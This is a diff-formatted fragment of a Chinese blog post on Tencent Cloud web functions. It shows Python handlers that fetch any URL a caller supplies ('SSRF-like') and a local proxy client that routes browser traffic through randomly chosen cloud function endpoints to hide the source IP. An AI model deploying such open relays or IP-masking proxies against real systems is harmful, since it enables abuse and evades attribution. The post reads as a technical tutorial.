+<td>请求来源的 API 网关的配置信息、请求标识、认证信息、来源信息。其中：serviceId，path，httpMethod 指向 API 网关的服务 ID、API 的路径和方法。stage 指向请求来源 API 所在的环境。requestId 标识当前这次请求的唯一 ID。identity 标识用户的认证方法和认证的信息。sourceIp 标识请求来源 IP。</td>
+</tr>
+<tr>
+<td>path</td>
+<td>记录实际请求的完整 Path 信息。</td>
+</tr>
+<tr>
+<td>httpMethod</td>
+<td>记录实际请求的 HTTP 方法。</td>
+</tr>
+<tr>
+<td>queryString</td>
+<td>记录实际请求的完整 Query 内容。</td>
+</tr>
+<tr>
+<td>body</td>
+<td>记录实际请求转换为 String 字符串后的内容。</td>
+</tr>
+<tr>
+<td>headers</td>
+<td>记录实际请求的完整 Header 内容。</td>
+</tr>
+<tr>
+<td>pathParameters</td>
+<td>记录在 API 网关中配置过的 Path 参数以及实际取值。</td>
+</tr>
+<tr>
+<td>queryStringParameters</td>
+<td>记录在 API 网关中配置过的 Query 参数以及实际取值。</td>
+</tr>
+<tr>
+<td>headerParameters</td>
+<td>记录在 API 网关中配置过的 Header 参数以及实际取值。</td>
+</tr>
+</tbody></table>
+<h4 id="API-网关触发器的集成响应返回数据结构"><a href="#API-网关触发器的集成响应返回数据结构" class="headerlink" title="API 网关触发器的集成响应返回数据结构"></a>API 网关触发器的集成响应返回数据结构</h4><p>在 API 网关设置为集成响应时，需要将包含以下 JSON 格式的数据结构返回给 API 网关。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;isBase64Encoded&quot;: false,</span><br><span class="line">  &quot;statusCode&quot;: 200,</span><br><span class="line">  &quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,</span><br><span class="line">  &quot;body&quot;: &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Heading&lt;/h1&gt;&lt;p&gt;Paragraph.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数据结构内容详细说明如下：</p>
+<table>
+<thead>
+<tr>
+<th>结构名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>isBase64Encoded</td>
+<td>指明 body 内的内容是否为 Base64 编码后的二进制内容，取值需要为 JSON 格式的 true 或 false。</td>
+</tr>
+<tr>
+<td>statusCode</td>
+<td>HTTP 返回的状态码，取值需要为 Integer 值。</td>
+</tr>
+<tr>
+<td>headers</td>
+<td>HTTP 返回的头部内容，取值需要为多个 key-value 对象，或 <code>key:[value,value]</code> 对象。其中 key、value 均为字符串。headers 请求头暂不支持 Location key。</td>
+</tr>
+<tr>
+<td>body</td>
+<td>HTTP 返回的 body 内容。</td>
+</tr>
+</tbody></table>
+<h1 id="WEB-函数的实际应用"><a href="#WEB-函数的实际应用" class="headerlink" title="WEB 函数的实际应用"></a>WEB 函数的实际应用</h1><h2 id="创建-WEB-函数"><a href="#创建-WEB-函数" class="headerlink" title="创建 WEB 函数"></a>创建 WEB 函数</h2><p>1.访问腾讯云云函数：<a target="_blank" rel="noopener" href="https://console.cloud.tencent.com/scf/list">https://console.cloud.tencent.com/scf/list</a></p>
+<p>2.选择地区</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PvfVE33PNszlmayDJD4qxeXgiavFQSg0ziagWdm8qcDfKNv21ibOeBwUng/640?wx_fmt=png" alt="img"></p>
+<p>3.新建云函数，选择自定义模板。为了测试云函数，代码先选择默认的</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6Pfalr6XuQjRv6YJmphnbheiaXUiaXtrVnw12zV2libkgMnH3pHK81kldEA/640?wx_fmt=png" alt="img"></p>
+<p>4.配置 触发器，选择 api 网关</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PiaOFeWR1RGcsEqu1JjTE1KINOqsEcrIGCBlmvo4P1PF7W8tEYK8vdfQ/640?wx_fmt=png" alt="img"></p>
+<ol start="5">
+<li>访问云函数</li>
+</ol>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6P7eNicSbkXkgBeEp5th3T4Qowe8dlGEW7cdOLSoichddBJ8G1vXfYeH9A/640?wx_fmt=png" alt="img"></p>
+<ol start="6">
+<li>查看访问日志</li>
+</ol>
+<p>浏览器访问，返回 403</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PTPhlSm3QPhcqapnU7C8BP6pib6J3zJTywf64mY5OMw0j4a4aao11EOA/640?wx_fmt=png" alt="img"></p>
+<p>查看日志，可以看到来源 ip 和请求方法，请求服务，请求路径等等</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PBEsM3jZoKGmrsv7lruNHklxBjCmQHt2PeQasPpvHOF7asfujr90atQ/640?wx_fmt=png" alt="img"></p>
+<p>修改 WEB 函数的返回内容为下面代码，在通过浏览器访问就会正常了。至此，WEB 函数的实际使用流程走通了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&quot;isBase64Encoded&quot;: False,&quot;statusCode&quot;: 200,&quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,&quot;body&quot;: &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Heading&lt;/h1&gt;&lt;p&gt;Paragraph.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;&#125;</span><br><span class="line">  return(a)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PZJK83bPAAHh9Ofr5y1NklPN50m774Xy1QeaOstYhwoXXAibicUcz6whw/640?wx_fmt=png" alt="img"></p>
+<h2 id="HTTP-代理测试"><a href="#HTTP-代理测试" class="headerlink" title="HTTP 代理测试"></a>HTTP 代理测试</h2><h3 id="实现-GET-型类-SSRF"><a href="#实现-GET-型类-SSRF" class="headerlink" title="实现 GET 型类 SSRF"></a>实现 GET 型类 SSRF</h3><p>在 WEB 函数中，可以使用 queryString 字段来获取 GET 请求的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">  # 提取GET查询</span><br><span class="line">  query = event[&#x27;queryString&#x27;]</span><br><span class="line">  # 获取query中的url</span><br><span class="line">  url = query[&#x27;url&#x27;]</span><br><span class="line">  # 使用requests模块请求url，并将结果返回</span><br><span class="line">  resp = requests.get(url)</span><br><span class="line">  t = resp.content.decode()</span><br><span class="line">  text = &#123;&quot;isBase64Encoded&quot;: False,&quot;statusCode&quot;: 200,&quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,&quot;body&quot;: t&#125;</span><br><span class="line"></span><br><span class="line">  return(text)</span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问效果如下：</p>
+<p>访问百度</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PUOzrtibPtj4DIJLQF9fbu4clVIHwmVzb95MBlZFw8lZaUkaSyCiaFTRQ/640?wx_fmt=png" alt="img"></p>
+<p>访问 <a target="_blank" rel="noopener" href="http://tool.chinaz.com/ipwhois%EF%BC%8C%E6%9F%A5%E7%9C%8B">http://tool.chinaz.com/ipwhois，查看</a> ip</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PiarwiaHG0f980YtlM0QTuD4JribTzrOKamAruUgsr9NzDNCc3lAnEIlIQ/640?wx_fmt=png" alt="img"></p>
+<h3 id="POST-型类-SSRF"><a href="#POST-型类-SSRF" class="headerlink" title="POST 型类 SSRF"></a>POST 型类 SSRF</h3><p>将 WEB 函数改为下面这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">  # 提取POST过来的body内容</span><br><span class="line">  body = event[&#x27;body&#x27;]</span><br><span class="line">  # 因为body是字符串，所以先转换为字典</span><br><span class="line">  body = json.loads(body)</span><br><span class="line">  # 获取body中的url</span><br><span class="line">  url = body[&#x27;url&#x27;]</span><br><span class="line">  # 使用requests模块请求url，并将结果返回</span><br><span class="line">  resp = requests.get(url)</span><br><span class="line">  text = &#123;&quot;isBase64Encoded&quot;: False,&quot;statusCode&quot;: 200,&quot;headers&quot;: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;,&quot;body&quot;: resp.content.decode()&#125;</span><br><span class="line">  return(text)</span><br></pre></td></tr></table></figure>
+
+<p>通过在线 http 接口测试工具，来验证 WEB 函数</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6ProH1icMh1Yick7ZpsSvgumlOXPsAb6tQuXmtxVKWibJ5Oq2JtcuB0GLsA/640?wx_fmt=png" alt="img"></p>
+<p>3.HTTP 代理 DEMO</p>
+<p>云函数可利用 API 网关触发器进行触发，接受来自客户端的数据，然后云函数可以对外发包，类似于一个 SSRF。</p>
+<p>因此一个 HTTP 代理的实现思路就很简单了。本地客户端通过代理发送数据包，HTTP 代理服务器拦截数据包，提取 HTTP 报文相关信息，然后将报文以 JSON 格式 POST 到云函数进行解析，云函数根据解析到的信息对目标发起请求，最终将结果一层一层返回到客户端。</p>
+<p>服务端依旧使用上面的 POST 型的 SSRF 代码，然后部署在 WEB 函数里，用来做代理请求公网资源。</p>
+<p>客户端代码实现如下：</p>
+<p>客户端是代理本地端口，接收浏览器请求，然后将请求转发给 web 函数，并接收 web 函数的返回结果，再将 web 函数的返回结果返回给浏览器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"># @Author   : ordar</span><br><span class="line"># @Python   : 3.7.5</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"># 定义允许连接此服务端的ip和服务端端口，0.0.0.0代表任意ip都可以连接这个服务端</span><br><span class="line">bind_ip = &quot;0.0.0.0&quot;</span><br><span class="line">bind_port = 8080</span><br><span class="line"># 服务地址应该是元组格式</span><br><span class="line">bind_server = (bind_ip, bind_port)</span><br><span class="line"></span><br><span class="line"># 建立一个socket对象</span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"># 服务端绑定服务地址到套接字，</span><br><span class="line">server.bind(bind_server)</span><br><span class="line"># 监听端口，backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。</span><br><span class="line">server.listen(5)</span><br><span class="line">print(&quot;Listen on &#123;&#125;:&#123;&#125;&quot;.format(bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"># 定义WEB函数参数</span><br><span class="line">u_server = [&quot;https://service-3uzdw232-1258639052.gz.apigw.tencentcs.com/release/helloworld-1627548324&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义客户端处理线程,打印客户端传来的数据并回应</span><br><span class="line">def handle_client(client_socket):</span><br><span class="line">  request_byte = client_socket.recv(1024)</span><br><span class="line">  request_str = request_byte.decode()</span><br><span class="line">  print(&quot;Received: &#123;&#125;&quot;.format(request_str))</span><br><span class="line">  # 使用云函数去请求数据</span><br><span class="line">  # 先使用正则提取url</span><br><span class="line">  url = &quot;&quot;</span><br><span class="line">  resp_text = &quot;&quot;</span><br><span class="line">  try:</span><br><span class="line">      url = re.findall(r&quot;GET (.*?) HTTP/1.1&quot;, request_str)[0]</span><br><span class="line">      print(url)</span><br><span class="line">  except Exception as e:</span><br><span class="line">      print(e)</span><br><span class="line">  if url:</span><br><span class="line">      resp_text = get_response(url)</span><br><span class="line">  print(&quot;Response: &#123;&#125;&quot;.format(resp_text))</span><br><span class="line">  # 返还一个数据包，然后关闭连接</span><br><span class="line">  client_socket.send(str(resp_text).encode(&#x27;utf-8&#x27;))</span><br><span class="line">  client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 使用WEB函数，获取WEB函数的返回</span><br><span class="line">def get_response(url):</span><br><span class="line">  resp = requests.post(random.choice(u_server), json=&#123;&quot;url&quot;: url&#125;)</span><br><span class="line">  return resp.content.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 循环等待客户端连接</span><br><span class="line">while True:</span><br><span class="line">  # 被动接受TCP客户端连接,(阻塞式)等待连接的到来</span><br><span class="line">  client, address = server.accept()</span><br><span class="line">  print(&quot;Accept connection from: &#123;&#125;:&#123;&#125;&quot;.format(address[0], address[1]))</span><br><span class="line"></span><br><span class="line">  # 创建客户端线程，处理传入的数据</span><br><span class="line">  client_handle_thread = threading.Thread(target=handle_client, args=(client,))</span><br><span class="line">  # 启动线程</span><br><span class="line">  client_handle_thread.start()</span><br></pre></td></tr></table></figure>
+
+<p>浏览器配置代理</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PG2snG9ia3YbwKK21FjJqGrJnIvndhooRsrbV02uTEEhl7u22OLsk4Xw/640?wx_fmt=png" alt="img"></p>
+<p>访问百度</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6PSIf61YXZicydITbibshPRXiaib0SenJY57jibM4MWg1GuJBFuUQrgXXM8vw/640?wx_fmt=png" alt="img"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6P6kc0AwmfVMTSqamxV3VVnLlxlvFqdgXL8ibmotDHtNNq4ocvaRHZ9zA/640?wx_fmt=png" alt="img"></p>
+<p>4.改进：HTTP 代理 DEMO</p>
+<p>上面的 HTTP 代理 DEMO 有个很明显的短板，服务端使用 resp &#x3D; requests.get(url) 来请求公网资源，只支持 GET 方法；本地客户端代理使用 url &#x3D; re.findall(r”GET (.*?) HTTP&#x2F;1.1”, request_str)[0] 来提取来自浏览器的 url，也是只能提取到 GET 方法。</p>
+<p>然后 HTTP 协议是支持 8 中请求方法的，所以为了实现完全的 HTTP 代理，要改进 demo 代码。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6P9l0ve9TKvI6sylVNplqzgfTQvDfPYxtYmvZbtv1dCEmqdrn93s1g4A/640?wx_fmt=png" alt="img"></p>
+<p>服务端代理改进后代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">  # 提取POST过来的body内容</span><br><span class="line">  body = event[&#x27;body&#x27;]</span><br><span class="line">  # 因为body是字符串，所以先转换为字典</span><br><span class="line">  body = json.loads(body)</span><br><span class="line">  # 获取body中的url</span><br><span class="line">  url = body[&#x27;url&#x27;]</span><br><span class="line">  # 获取body中的method</span><br><span class="line">  method = body[&#x27;method&#x27;]</span><br><span class="line">  # 获取body中的headers,然后转换为字典</span><br><span class="line">  headers = json.loads(body[&#x27;headers&#x27;])</span><br><span class="line">  # 使用requests模块请求url，并将结果返回</span><br><span class="line">  resp = requests.request(method=method, url=url, headers=headers)</span><br><span class="line">  text = &#123;&quot;isBase64Encoded&quot;: False, &quot;statusCode&quot;: 200, &quot;headers&quot;: &#123;&quot;Content-Type&quot;: &quot;text/html&quot;&#125;, &quot;body&quot;: resp.content.decode()&#125;</span><br><span class="line">  return(text)</span><br></pre></td></tr></table></figure>
+
+<p>客户端代理改进后代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"># @Author   : ordar</span><br><span class="line"># @Python   : 3.7.5</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"># 定义允许连接此服务端的ip和服务端端口，0.0.0.0代表任意ip都可以连接这个服务端</span><br><span class="line">bind_ip = &quot;0.0.0.0&quot;</span><br><span class="line">bind_port = 8080</span><br><span class="line"># 服务地址应该是元组格式</span><br><span class="line">bind_server = (bind_ip, bind_port)</span><br><span class="line"></span><br><span class="line"># 建立一个socket对象</span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"># 服务端绑定服务地址到套接字，</span><br><span class="line">server.bind(bind_server)</span><br><span class="line"># 监听端口，backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。</span><br><span class="line">server.listen(5)</span><br><span class="line">print(&quot;Listen on &#123;&#125;:&#123;&#125;&quot;.format(bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"># 定义WEB函数参数</span><br><span class="line">u_server = [&quot;WEB函数的url&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义客户端处理线程,打印客户端传来的数据并回应</span><br><span class="line">def handle_client(client_socket):</span><br><span class="line">  request_byte = client_socket.recv(1024)</span><br><span class="line">  request_str = request_byte.decode()</span><br><span class="line">  print(&quot;Received: &#123;&#125;&quot;.format(request_str))</span><br><span class="line"></span><br><span class="line">  # ########使用云函数去请求数据</span><br><span class="line">  resp_text = &quot;&quot;</span><br><span class="line">  try:</span><br><span class="line">      # 先使用正则提取url</span><br><span class="line">      temp = re.findall(r&quot;(\w+) (.*?) HTTP/1.1&quot;, request_str)[0]</span><br><span class="line">      method = temp[0]</span><br><span class="line">      url = temp[1]</span><br><span class="line">      # 解析headers</span><br><span class="line">      headers = &#123;&#125;</span><br><span class="line">      if url:</span><br><span class="line">          a = request_str.strip().split(&quot;\n&quot;)[2:]</span><br><span class="line">          for line in a:</span><br><span class="line">              if &quot;:&quot; in line:</span><br><span class="line">                  line_a = line.strip().split(&quot;: &quot;, 1)</span><br><span class="line">                  line_b = &#123;line_a[0]: line_a[1]&#125;</span><br><span class="line">                  headers.update(line_b)</span><br><span class="line">          headers.pop(&quot;Connection&quot;)</span><br><span class="line">      data = &#123;</span><br><span class="line">          &quot;method&quot;: method,</span><br><span class="line">          &quot;url&quot;: url,</span><br><span class="line">          &quot;headers&quot;: json.dumps(headers)</span><br><span class="line">      &#125;</span><br><span class="line">      print(data)</span><br><span class="line">      print(&quot;\n&quot;)</span><br><span class="line">      resp_text = get_response(data)</span><br><span class="line">      print(&quot;Response: &#123;&#125;&quot;.format(resp_text))</span><br><span class="line">  except Exception as e:</span><br><span class="line">      print(e)</span><br><span class="line">  # 返还一个数据包，然后关闭连接</span><br><span class="line">  client_socket.send(str(resp_text).encode(&#x27;utf-8&#x27;))</span><br><span class="line">  client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 使用WEB函数，获取WEB函数的返回</span><br><span class="line">def get_response(data):</span><br><span class="line">  # 给WEB函数发送请求</span><br><span class="line">  resp = requests.post(url=random.choice(u_server), json=data)</span><br><span class="line">  return resp.content.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 循环等待客户端连接</span><br><span class="line">while True:</span><br><span class="line">  # 被动接受TCP客户端连接,(阻塞式)等待连接的到来</span><br><span class="line">  client, address = server.accept()</span><br><span class="line">  print(&quot;Accept connection from: &#123;&#125;:&#123;&#125;&quot;.format(address[0], address[1]))</span><br><span class="line"></span><br><span class="line">  # 创建客户端线程，处理传入的数据</span><br><span class="line">  client_handle_thread = threading.Thread(target=handle_client, args=(client,))</span><br><span class="line">  # 启动线程</span><br><span class="line">  client_handle_thread.start()</span><br></pre></td></tr></table></figure>
+
+<p><em>参考链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/583">https://cloud.tencent.com/document/product/583</a></em></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">云函数</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E7%B1%BBSSRF/">展开全文 >></a>
     </p>
     
 
